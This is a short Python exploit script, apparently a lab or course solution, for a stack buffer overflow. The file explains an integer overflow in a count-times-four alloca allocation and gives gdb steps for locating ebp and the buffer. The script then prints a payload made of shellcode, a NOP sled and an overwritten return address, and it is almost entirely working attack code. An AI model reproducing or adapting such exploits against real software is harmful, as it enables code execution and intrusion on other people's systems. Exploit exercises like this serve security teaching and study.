# from shellcode import shellcode
# from struct import pack
# ebp = 0xbffed1b8
# # buf = 0x80f1384
# shell = 0xbffed14c
# count = 0xc000000f
# print pack("<I", count) + shellcode + "\x90"*(ebp - buf + 4 - len(shellcode)) + pack("<I", shell)

from shellcode import shellcode
from struct import pack

'''
Procedure to carry out the exploit
----------------------------------

Vulnerability: The alloca( ) function allocates space on the stack for
4*count bytes. The fread then puts the shellcode and the return address
into the allocated space. The idea is to allocate less and put more on the
stack.

We can do this by catching the vulnerability which is due to the way multiplication
by 4 works. essentially we can give a large number to count and then left shift it
by 2 and get a smaller number and overflow that easily

Steps:

b read_file
r
<break just after the buffer allocation - use line numbers>
c
info reg
note down the value of ebp(variable ebp)
x &buf -- note down the value of &buf, that is where the memory is allocated(variable return_address)

'''


ebp = 0xbffed1b8
count = 0xC000000F
return_address = 0xbffed140
print pack("<I",count)  + shellcode + "\x90"*(ebp-return_address+4-len(shellcode))+ pack("<I", return_address)
